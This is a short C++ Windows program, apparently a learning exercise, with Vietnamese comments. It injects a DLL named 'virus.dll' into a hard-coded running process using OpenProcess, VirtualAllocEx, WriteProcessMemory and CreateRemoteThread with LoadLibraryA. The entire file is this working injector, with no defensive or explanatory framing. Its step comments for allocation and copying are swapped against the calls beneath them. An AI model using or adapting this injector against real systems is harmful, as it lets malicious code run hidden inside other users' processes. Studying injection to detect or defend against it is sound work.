
#include <iostream>
#include <Windows.h>

int main()
{
	
	LPCSTR DllPath = "D:\\virus\\x64\\Debug\\virus.dll";

	// Bước 1 Can thiệp vào Process
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 8880);
	// Bước 2 Copy DLL và xác định địa chỉ
	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath) + 1,
		MEM_COMMIT, PAGE_READWRITE);

	// Bước 3 Cấp phát vùng nhớ
	WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath,
		strlen(DllPath) + 1, 0);

	// Bước 4 Thực thi DLL
	HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"),
			"LoadLibraryA"), pDllPath, 0, 0);

	WaitForSingleObject(hLoadThread, INFINITE);

	std::cout << "Dll path allocated at: " << std::hex << pDllPath << std::endl;
	std::cin.get();


	VirtualFreeEx(hProcess, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

	return 0;
}